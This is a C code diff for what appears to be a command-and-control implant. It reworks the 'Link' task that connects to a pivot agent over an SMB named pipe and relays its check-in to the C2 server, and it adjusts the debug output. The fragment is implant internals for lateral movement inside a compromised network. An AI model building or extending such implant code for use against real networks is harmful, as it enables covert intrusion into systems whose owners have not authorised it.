@@ -27,7 +27,7 @@ VOID Link(PCHAR taskUuid, PPARSER arguments)
 
     SIZE_T targetLen    = 0;
     SIZE_T pipeLen      = 0;
-	// PCHAR  Target 		= ParserGetString(arguments, &targetLen);
+    // PCHAR  Target 		= ParserGetString(arguments, &targetLen);
     PCHAR Target = "test";
 	PCHAR  PipeName     = ParserGetString(arguments, &pipeLen);
 
@@ -41,26 +41,29 @@ VOID Link(PCHAR taskUuid, PPARSER arguments)
 
 
     /* Connect to Pivot Agent */
+    DWORD Result = 0;
     if ( !LinkAdd(Target, PipeName, &outBuf, &outLen) ) 
     {
         _err("Failed to link smb agent.");
-        DWORD error = GetLastError();
-        PackageError(taskUuid, error);
+        Result = GetLastError();
+        PackageError(taskUuid, Result);
         goto END;
     }
 
-    // Response package
+    // ( LINK_ADD byte + taskuuid + RESULT byte + Agent2-checkin )
     PPackage locals = PackageInit(LINK_ADD, TRUE);
     PackageAddString(locals, taskUuid, FALSE);
+    PackageAddInt32(locals, Result);
     PackageAddString(locals, outBuf, TRUE);
 
     // Send package
     PARSER Response = { 0 };
     PackageSend(locals, &Response);
 
-    _dbg("RESPONSE FROM LINK: %s", Response.Buffer);
-    // success
-    // PackageComplete(taskUuid, locals);
+    _dbg("LINK RESPONSE BUFFER");
+    print_bytes(Response.Buffer, Response.Length);
+
+    /* Now subsequent responses from C2 will contain delegate messages for Link(s) */
 
 END:
 
@@ -157,9 +160,6 @@ BOOL LinkAdd( PCHAR Target, PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen )
     // Add this Pivot Link to list
     {
         _dbg("Read %d bytes of data from Link.\n", *outLen);
-
-        _dbg("RAW Data : %s", *outBuf);
-
         //PCHAR NewLinkId = NULL;                                                 // Allocated in PivotParseLinkId must free
         //PivotParseLinkId(*outBuf, *outLen, *NewLinkId); 
 
